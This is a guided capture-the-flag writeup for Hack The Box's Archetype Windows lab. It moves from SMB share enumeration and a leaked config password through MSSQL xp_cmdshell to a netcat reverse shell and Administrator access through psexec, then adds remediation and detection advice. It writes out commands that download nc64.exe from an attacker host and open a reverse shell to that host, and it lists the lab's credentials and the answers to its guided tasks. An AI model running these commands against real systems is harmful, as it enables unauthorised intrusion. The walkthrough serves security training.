# HTB Archetype - Comprehensive Guided Lab Writeup

## Executive Summary

**Archetype** is a Windows-based CTF lab from Hack The Box's Tier II Starting Point series, designed to introduce penetration testers to intermediate Windows exploitation techniques. This machine focuses on Microsoft SQL Server misconfigurations, SMB enumeration, and Windows privilege escalation paths.

### Key Learning Outcomes
- **Primary Vulnerabilities**: SQL Server misconfiguration, credential exposure in SMB shares, PowerShell history credential leakage
- **Tools Used**: nmap, smbclient, Impacket (mssqlclient.py, psexec.py), winPEAS, netcat
- **Skill Level**: Intermediate (Tier II)
- **Estimated Completion Time**: 2-3 hours

### Attack Chain Summary
1. Network reconnaissance reveals SMB and MSSQL services
2. SMB enumeration discovers accessible backup share with configuration file
3. Configuration file contains SQL service account credentials
4. MSSQL authentication leads to command execution via xp_cmdshell
5. Reverse shell establishment and user flag capture
6. PowerShell history analysis reveals administrator credentials
7. Privilege escalation to Administrator and root flag capture

---

## Reconnaissance

### Network Scanning and Service Enumeration

The initial reconnaissance phase begins with comprehensive network scanning to identify open ports and running services on the target system.

```bash
nmap -sC -sV {TARGET_IP}
```

**Scan Results Analysis:**
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 15:00 CEST
Nmap scan report for {TARGET_IP}
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
```

**Key Findings:**
- **Port 135**: Microsoft RPC endpoint mapper
- **Port 139/445**: SMB/NetBIOS services (file sharing)
- **Port 1433**: Microsoft SQL Server 2017 (primary attack vector)

The presence of both SMB and SQL Server services suggests potential for credential discovery and database exploitation.

---

## Guided Questions Analysis

### Task 1: Which TCP port is hosting a database server?

**Question Importance:**
- **Learning Objective**: Understanding database service identification and port recognition
- **CTF Progression**: Foundation for SQL Server exploitation path
- **Real-world Relevance**: Database servers are high-value targets in penetration testing

**Methodology:**
The nmap scan clearly identifies Microsoft SQL Server running on its default port. Database services typically run on well-known ports that penetration testers must recognize.

**Answer**: **1433**

---

### Task 2: What is the name of the non-Administrative share available over SMB?

**Question Importance:**
- **Learning Objective**: SMB enumeration and share discovery techniques
- **CTF Progression**: Identifies the path to credential discovery
- **Real-world Relevance**: Misconfigured SMB shares are common attack vectors

**Methodology:**

**Step 1: SMB Share Enumeration**
```bash
smbclient -N -L \\\\{TARGET_IP}\\
```
- `-N`: No password authentication
- `-L`: List available shares

**Step 2: Analyze Share Results**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

**Step 3: Share Access Analysis**
- **ADMIN$** and **C$**: Administrative shares (Access Denied expected)
- **backups**: Non-administrative share (potential target)
- **IPC$**: Inter-Process Communication share

**Answer**: **backups**

---

### Task 3: What is the password identified in the file on the SMB share?

**Question Importance:**
- **Learning Objective**: File analysis and credential extraction from configuration files
- **CTF Progression**: Provides authentication credentials for SQL Server access
- **Real-world Relevance**: Configuration files commonly contain hardcoded credentials

**Methodology:**

**Step 1: Access the Backups Share**
```bash
smbclient -N \\\\{TARGET_IP}\\backups
```

**Step 2: Enumerate Share Contents**
```bash
smb: \> dir
prod.dtsConfig                    AR      609  Mon Jan 20 13:23:02 2020
```

**Step 3: Download Configuration File**
```bash
smb: \> get prod.dtsConfig
```

**Step 4: Analyze Configuration Content**
```bash
cat prod.dtsConfig
```

**Configuration File Analysis:**
The file contains XML configuration data with a clear-text password:
```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." />
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property"
    Path="\Package.Connections[Destination].Properties[ConnectionString]"
    ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User
        ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist
        Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

**Credential Extraction:**
- **Username**: ARCHETYPE\sql_svc
- **Password**: M3g4c0rp123
- **Service**: SQL Server connection string

**Answer**: **M3g4c0rp123**

---

### Task 4: What script from Impacket collection can be used to establish an authenticated connection to Microsoft SQL Server?

**Question Importance:**
- **Learning Objective**: Introduction to Impacket toolkit and SQL Server interaction
- **CTF Progression**: Enables database access and command execution
- **Real-world Relevance**: Impacket is essential for Windows penetration testing

**Methodology:**

**Step 1: Understanding Impacket**
Impacket is a collection of Python classes providing low-level programmatic access to network protocols, particularly useful for Windows environments.

**Step 2: SQL Server Connection Tools**
The Impacket suite includes specialized tools for various Windows services:
- `mssqlclient.py`: Microsoft SQL Server client
- `psexec.py`: Remote command execution
- `smbclient.py`: SMB client functionality

**Step 3: Tool Selection Rationale**
For SQL Server authentication and interaction, `mssqlclient.py` provides:
- Windows authentication support
- SQL query execution
- Extended stored procedure access

**Answer**: **mssqlclient.py**

---

### Task 5: What extended stored procedure can be used to spawn a Windows command shell?

**Question Importance:**
- **Learning Objective**: Understanding SQL Server extended stored procedures and command execution
- **CTF Progression**: Enables transition from database access to system shell
- **Real-world Relevance**: xp_cmdshell is a critical escalation technique in SQL Server exploitation

**Methodology:**

**Step 1: SQL Server Authentication**
```bash
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@{TARGET_IP} -windows-auth
```

**note**:
If you are using a virtual enviroment mssqlclient.py may be installed in a different path, so you may need to use the full path to the script. Run `which mssqlclient.py` to find the correct path.

**Step 2: Verify Administrative Privileges**
```sql
SELECT is_srvrolemember('sysadmin');
```
Result: `1` (True - sysadmin privileges confirmed)

**Step 3: Extended Stored Procedure Research**
Extended stored procedures in SQL Server allow execution of external programs:
- `xp_cmdshell`: Executes Windows command shell commands
- `sp_configure`: Manages server configuration options

**Step 4: Enable xp_cmdshell**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Step 5: Command Execution Test**
```sql
EXEC xp_cmdshell 'whoami';
```

**Answer**: **xp_cmdshell**

---

## Exploitation Details

### SQL Server Command Execution

**Vulnerability Analysis:**
- **Type**: CWE-78 (OS Command Injection via SQL Server)
- **Root Cause**: SQL Server misconfiguration with sysadmin privileges and enabled xp_cmdshell
- **Risk Level**: Critical (Remote Code Execution)

**Exploit Development:**

**Step 1: Establish Reverse Shell Infrastructure**
```bash
# Terminal 1: HTTP server for file transfer
sudo python3 -m http.server 80

# Terminal 2: Netcat listener
sudo nc -lvnp 443
```

**Step 2: Upload Netcat Binary**
```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://{ATTACKER_IP}/nc64.exe -outfile nc64.exe"
```
**Note**: Get your attacker IP from the terminal where you started the HTTP server. Use the follwiong command to get your IP:
```bash
ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
```
**Breakdown of each command:**

- `ip addr show tun0`  
  Shows detailed information about the `tuno` network interface, including its IP addresses. This is the vpn interface

- `grep 'inet '`  
  Filters the output to lines containing `inet `, which represent IPv4 addresses (excluding IPv6, which uses `inet6`).

- `awk '{print $2}'`  
  Prints the second column from the filtered line, which contains the IP address with its subnet mask (e.g., `10.0.0.186/24`).

- `cut -d/ -f1`  
  Splits the output at the `/` character and returns the first part, which is the plain IP address (e.g., `10.0.0.186`).

**Step 3: Execute Reverse Shell**
```sql
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe {ATTACKER_IP} 443"
```
**Detailed Breakdown:**

- `xp_cmdshell`  
  A Microsoft SQL Server extended stored procedure that allows execution of arbitrary command-line commands from within SQL Server. It is often used for administrative tasks, but can be abused for command execution if enabled.

- `"powershell -c ..."`  
  Runs the Windows PowerShell command-line interpreter with the `-c` (or `-Command`) flag, which tells PowerShell to execute the following string as a command.

- `cd C:\Users\sql_svc\Downloads;`  
  Changes the current working directory to `C:\Users\sql_svc\Downloads`. The semicolon (`;`) separates this command from the next one in PowerShell.

- `.\nc64.exe -e cmd.exe {ATTACKER_IP} 443`  
  - `.\nc64.exe`  
    Runs the `nc64.exe` executable (Netcat for 64-bit Windows) located in the current directory.
  - `-e cmd.exe`  
    Tells Netcat to execute `cmd.exe` (the Windows command prompt) and redirect its input/output through the network connection.
  - `{ATTACKER_IP}`  
    Placeholder for the attacker's IP address. Netcat will connect to this IP.
  - `443`  
    The port number on the attacker's machine to connect to (commonly used for HTTPS, but here used for the reverse shell).

**Summary:**  
This command, when run on a SQL Server with `xp_cmdshell` enabled, launches PowerShell to change to a specific directory, then uses Netcat to create a reverse shell. It connects back to the attacker's IP on port 443, giving the attacker remote command-line access to the server.
`
**Proof of Concept:**
Successfully obtained reverse shell as `archetype\sql_svc` with interactive command prompt access.

---

## Privilege Escalation

### PowerShell History Analysis

**Step 1: Enumerate User Environment**
```cmd
whoami
cd C:\Users\sql_svc\Desktop
dir
```

**User Flag Capture:**
Located in `C:\Users\sql_svc\Desktop\user.txt`

**Step 2: Advanced Enumeration with winPEAS**
```bash
# Download and transfer winPEAS
powershell -c "wget http://10.10.16.6/winPEASx64.exe -OutFile winPEASx64.exe"
.\winPEASx64.exe
```

**Step 3: PowerShell History Investigation**
```cmd
cd C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
type ConsoleHost_history.txt
```

**Critical Discovery:**
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

**Administrator Credential Extraction:**
- **Username**: administrator
- **Password**: MEGACORP_4dm1n!!

---

### Task 6: What file contains the administrator's password?

**Question Importance:**
- **Learning Objective**: Understanding Windows credential storage and PowerShell history forensics
- **CTF Progression**: Provides path to privilege escalation
- **Real-world Relevance**: PowerShell history is often overlooked during security assessments

**Answer**: **ConsoleHost_history.txt**

---

### Task 7: What script can be used to search for possible privilege escalation paths on Windows hosts?

**Question Importance:**
- **Learning Objective**: Introduction to automated privilege escalation enumeration
- **CTF Progression**: Demonstrates systematic approach to Windows privilege escalation
- **Real-world Relevance**: Automated enumeration tools are essential for comprehensive assessments

**Answer**: **winPEAS** (or winPEASx64.exe)

---

## Administrative Access

**Step 1: PSExec Authentication**
```bash
python3 /home/ryan/venv/bin/psexec.py ARCHETYPE/administrator@{TARGET_IP}
# Password: MEGACORP_4dm1n!!
```

**Step 2: System Verification**
```cmd
whoami
# nt authority\system
```

**Step 3: Root Flag Capture**
```cmd
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

---

## Flag Summary

| Flag ID   | Associated Task      | Capture Method                                               | Difficulty |
|-----------|----------------------|--------------------------------------------------------------|------------|
| User Flag | Initial Access       | SQL Server exploitation → Reverse shell → User desktop       | 3/5        |
| Root Flag | Privilege Escalation | PowerShell history analysis → PSExec → Administrator desktop | 4/5        |

**Flag Locations:**
- **User Flag**: `C:\Users\sql_svc\Desktop\user.txt`
- **Root Flag**: `C:\Users\Administrator\Desktop\root.txt`

---

## Lessons Learned

### Key Cybersecurity Concepts

1. **Configuration Security**: Default configurations and exposed services create attack vectors
2. **Credential Management**: Hardcoded passwords in configuration files pose significant risks
3. **Principle of Least Privilege**: SQL service accounts with sysadmin privileges enable lateral movement
4. **Forensic Artifacts**: PowerShell history files retain sensitive command history

### Common Pitfalls and Avoidance

- **SMB Share Permissions**: Always verify share access controls and content sensitivity
- **SQL Server Hardening**: Disable unnecessary extended stored procedures like xp_cmdshell
- **Credential Rotation**: Regularly update service account passwords
- **History Management**: Implement PowerShell history clearing policies

### Alternative Approaches

- **SeImpersonatePrivilege Exploitation**: Could have used Juicy Potato instead of credential discovery
- **Registry Analysis**: Additional credential sources exist in Windows registry
- **Token Impersonation**: Alternative privilege escalation via service token manipulation

---

## Remediation

### Vulnerability-Specific Fixes

**1. SQL Server Configuration**
```sql
-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Remove sysadmin privileges from service accounts
-- Create dedicated low-privilege SQL accounts
```

**2. SMB Share Security**
- Remove public access to backup shares
- Implement access control lists (ACLs)
- Regular share permission audits

**3. Credential Management**
- Replace hardcoded passwords with integrated authentication
- Implement password rotation policies
- Use Windows service account management

**4. PowerShell Security**
```powershell
# Enable PowerShell logging
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1

# Configure history retention policies
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

### Configuration Hardening

**SQL Server Hardening:**
- Disable unnecessary extended stored procedures
- Implement network segmentation
- Enable SQL Server audit logging
- Use Windows Authentication exclusively

**Windows Hardening:**
- Enable Windows Defender ATP
- Implement application whitelisting
- Configure advanced audit policies
- Regular security baseline assessments

### Monitoring and Detection

**Detection Strategies:**
- Monitor xp_cmdshell execution attempts
- Log SMB share access patterns
- PowerShell command logging and analysis
- Network traffic analysis for unusual database connections

**Recommended Tools:**
- Windows Event Forwarding (WEF)
- Sysmon for detailed process monitoring
- SQL Server audit logs
- Network intrusion detection systems

---

## Tools and References

### Primary Tools Used

| Tool | Version | Purpose | Key Commands |
|------|---------|---------|--------------|
| nmap | 7.91 | Network scanning | `nmap -sC -sV {TARGET_IP}` |
| smbclient | 4.13.5 | SMB enumeration | `smbclient -N -L \\\\{TARGET_IP}\\` |
| Impacket | 0.9.22 | Windows protocol interaction | `mssqlclient.py`, `psexec.py` |
| winPEAS | Latest | Windows privilege escalation | `.\winPEASx64.exe` |
| netcat | 1.10 | Reverse shell | `nc -lvnp 443` |

### Command Reference

**SMB Enumeration:**
```bash
smbclient -N -L \\\\{TARGET_IP}\\          # List shares
smbclient -N \\\\{TARGET_IP}\\backups      # Access specific share
get [filename]                              # Download file
```

**SQL Server Interaction:**
```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```

```sql
SELECT is_srvrolemember('sysadmin');        # Check privileges
EXEC sp_configure 'xp_cmdshell', 1;         # Enable command execution
EXEC xp_cmdshell 'whoami';                  # Execute system commands
```

**PowerShell Commands:**
```powershell
cd C:\Users\sql_svc\Downloads               # Navigate directories
wget http://IP/file -outfile file           # Download files
.\nc64.exe -e cmd.exe IP PORT               # Reverse shell
```

### External Resources

- [Impacket Documentation](https://github.com/SecureAuthCorp/impacket)
- [SQL Server Security Best Practices](https://docs.microsoft.com/en-us/sql/relational-databases/security/)
- [Windows Privilege Escalation Guide](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
- [winPEAS Repository](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PowerShell Security Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows)

### Additional Reading

- OWASP Testing Guide: SQL Injection Testing
- NIST Cybersecurity Framework
- SANS Windows Forensics and Incident Response
- Microsoft SQL Server Security Documentation

---

## Ethical Guidelines and Disclaimer

**⚠️ IMPORTANT NOTICE ⚠️**

This writeup is provided for **educational purposes only** and should be used exclusively in authorized testing environments. The techniques demonstrated are intended for:

- Authorized penetration testing engagements
- Educational laboratory environments
- Security research with proper authorization
- Defensive security training

**Legal Requirements:**
- Obtain explicit written authorization before testing any systems
- Ensure all activities comply with applicable laws and regulations
- Respect intellectual property and privacy rights
- Follow responsible disclosure practices for discovered vulnerabilities

**Flag Handling:**
- Actual flag values are not disclosed in this writeup
- Use format examples like `HTB{example_flag_format}` for educational purposes
- Submit flags only through official HTB platform

The techniques described should never be used against systems without explicit permission. Unauthorized access to computer systems is illegal and unethical.
